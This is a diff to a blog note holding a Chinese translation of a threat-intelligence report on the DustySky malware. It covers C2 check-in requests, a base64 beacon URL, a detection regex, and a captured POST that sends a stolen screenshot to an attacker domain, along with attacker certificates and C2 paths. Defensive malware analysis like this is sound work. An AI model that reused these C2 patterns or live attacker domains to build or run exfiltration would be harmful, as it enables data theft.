@@ -1,5 +1,5 @@
 ---
-title: Operation DustySky文档翻译----网安组任务
+title: Operation DustySky文档翻译
 date: 2019-03-01 15:46:33
 tags: [source]
 categories: [notes, work]
@@ -166,6 +166,8 @@ b：\ World-2015 \ IL \ Working Tools \ 2015-12-27 NeD Ver 9 Rand  -  192.169.6.
 
 DustySky有两个硬编码的命令和控制服务器域。 它首先通过向TEST.php或index.php发送GET请求来检查第一个是否处于活动状态，期望“OK”作为响应。 如果没有收到确定，它将尝试第二个域。
 
+<img src = "Operation DustySky_19.png" width = 80%>
+
 例如，这是对index.php的初始GET请求：
 
 ```shell
@@ -184,7 +186,7 @@ DustySky有两个硬编码的命令和控制服务器域。 它首先通过向TE
     Content-Length: 2
     Connection: close
     Content-Type: text/html; charset=UTF-8
-    
+
     OK
 ```
 
@@ -205,3 +207,114 @@ GET请求中URL的另一个示例：
 ```shell
     http://ra.goaglesmtp.co.vu/NSR.php?Pn=MWw1bEoxVDJqQiB8IFBTUFVCV1M&fr=&GR=REFGQksoTlNSKTxicj4gMjAxNS0xMS0wNA&com=IDxicj4gIDxicj4g&ID=13327920924134561851231757518321517760252DAFBK&o=TWljcm9zb2Z0IFdpbmRvd3MgNyBIb21lIFByZW1pdW0g&ho=cmEuZ29hZ2xlc210cC5jby52dQ==&av=&v=704
 ```
+
+<img src = "Operation DustySky_20.png" width = 80%>
+
+以下正则表达式与通信模式匹配：
+
+```js
+    \/[A-Za-z]{2,5}\.php\?(?:(Pn|fr|GR|com|ID|o|ho|av|v)=[A-Za-z0-9\/=+]*={0,2}&?){5,9}
+```
+
+作为POST请求发送到命令和控制的被盗信息：
+
+```shell
+    POST /RaR.php HTTP/1.1
+    Content-Type: application/x-www-form-urlencoded
+    User-Agent: 1042541562231131292551331782259622162135190107BK
+    Host: down.supportcom.xyz
+    Content-Length: 109127
+    Expect: 100-continue
+
+    ke=iVBORw0KGgoAAAANSUhEUgAAAyAAAAJYCAYAAACadoJwAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEh....
+    ID=1042541562231131292551331782259622162135190107BK&
+    N=Screen-2015-10-06_05-15-34-PM.png
+    HTTP/1.1 100 Continue
+```
+
+## SSL和数字证书
+
+最近，命令和控制通信从HTTP变为HTTPS。 HTTPS流量中使用的数字证书可以是自签名的，也可以使用合法的Comodo颁发的证书。
+
+域名'bulk-smtp [.] xyz'由攻击者拥有，使用以下数字证书：
+
+```shell
+    Certificate:
+        Data:
+            Version: 3 (0x2)
+            Serial Number:
+                35:e5:39:4c:58:e8:4d:f5:fa:9a:3c:25:21:12:01:19
+        Signature Algorithm: sha256WithRSAEncryption
+            Issuer: C=GB, ST=Greater Manchester, L=Salford, O=COMODO CA Limited,CN=COMODO RSA Domain Validation Secure Server CA
+            Validity
+                Not Before: Nov 25 00:00:00 2015 GMT
+                Not After : Nov 24 23:59:59 2016 GMT
+            Subject: OU=Domain Control Validated, OU=PositiveSSL, CN=bulk-smtp.xyz
+```
+
+<img src = "Operation DustySky_21.png" width = 60%>
+<img src = "Operation DustySky_22.png" width = 60%>
+
+在使用Comodo颁发的证书之前，攻击者使用了自签名证书，冒充一家名为EMS的以色列TelAviv公司。 证书中的组织统一性是“电子邮件营销销售”
+
+```shell
+    Certificate:
+        Data:
+            Version: 3 (0x2)
+            Serial Number: 13229300438499639338 (0xb797eaa82fb0c02a)
+        Signature Algorithm: sha256WithRSAEncryption
+            Issuer: C=IL, ST=Israel - Telaviv, L=Tel Aviv, O=EMS, OU=Email Markting Sales, CN=email-market.ml/emailAddress=info@email-market.ml
+            Validity
+                Not Before: Nov 17 14:15:08 2015 GMT
+                Not After : Nov 16 14:15:08 2016 GMT
+            Subject: C=IL, ST=Israel - Telaviv, L=Tel Aviv, O=EMS, OU=Email Markting Sales, CN=email-market.ml/emailAddress=info@email-market.ml
+```
+
+对于另一个域smtp.gq，使用了这个自签名证书：
+
+```shell
+    Certificate:
+        Data:
+            Version: 1 (0x0)
+            Serial Number: 12074485766838107425 (0xa79130d4e1e53d21)
+        Signature Algorithm: sha1WithRSAEncryption
+            Issuer: C=IL, ST=Tel Aviv, L=Tel Aviv, O=BEM, OU=BEM co., CN=smtp.gq/emailAddress=info@smtp.gq
+            Validity
+                Not Before: Nov 17 14:48:51 2015 GMT
+                Not After : Dec 17 14:48:51 2015 GMT
+            Subject: C=IL, ST=Tel Aviv, L=Tel Aviv, O=BEM, OU=BEM co.,CN=smtp.gq /emailAddress=info@smtp.gq
+```
+
+与其命令和控制服务器通信时，DustySky通信使用以下部分或全部路径：
+
+- Update.php
+- conn.php
+- geoiploc.php
+- news.htm
+- pass.php
+- passho.php
+- passyah.php
+
+## 基础设施
+
+使用PassiveTotal的攻击分析平台，我们能够可视化演员使用的关键基础设施的最近6个月的数据。 值得注意的是，在过去几周内所有IP地址都处于活动状态，其中许多域解析为动态DNS提供商（蓝色方块）和注册域（棕色方块）的组合（绿色方块）。 这些热图使我们能够识别可能由于演员调整战术而导致的有趣时期或基础设施变化。
+
+<img src = "Operation DustySky_23.png" width = 80%>
+
+在此图中，我们可以看到演员在12月23日之前使用了动态DNS和注册域的组合。 在那一天，演员似乎删除了注册域并严格使用动态DNS。 目前还不清楚为什么会发生这种情况，但服务器可能会改变攻击中的功能或者不再需要它。
+
+<img src = "Operation DustySky_24.png" width = 80%>
+
+在此图中，颜色可清楚地分析发生的活动。 感兴趣的主要时期似乎是动态DNS和注册域都在使用时。 这种情况发生在9月23日到12月17日，并且有很多天新域名与IP地址相关联。 虽然并不完全清楚，但这一时期可能反映了演员在其行动中的存在。 根据发送的电子邮件和编译日期，在此期间有大量的网络钓鱼活动正在进行中。 值得注意的是，此IP地址不再显示任何可能意味着已脱机的内容。
+
+<img src = "Operation DustySky_25.png" width = 80%>
+
+在此图中，我们看到从9月9日开始的活动被定向到动态DNS提供商。 与Graph One类似，我们可以看到11月份时间段内域名增加，12月份下降。 同样，并不完全清楚，但11月可能是攻击者认为有必要使他们在攻击中使用的域名多样化的点。
+
+<img src = "Operation DustySky_26.png" width = 80%>
+
+在此图中，灰色块表示大多数时间没有捕获任何活动。 从11月9日开始，演员们在添加动态DNS提供商之前引入了四个独特的注册域名。 这个IP地址最有趣的是动态DNS网址和注册域的内容导致托管Windows可执行文件的同一下载页面。 目前还不清楚为什么攻击者继续使用这两者，但是从注册域名转移到使用动态DNS域名也可能表明参与者开始明智了。 动态DNS基础结构的使用使得归因和跟踪更加困难，因为动态DNS域可以由无关联方共享。
+
+<img src = "Operation DustySky_27.png" width = 80%>
+
+在此图中，我们看到直到最近几个月同样缺乏数据以及动态DNS和注册域的使用。 鉴于最近的活动以及指向此IP地址的大量域名，这个服务器可能是最新的参与者，这似乎是合理的。 事实上，它可能涉及我们在今年看到的持续运营。
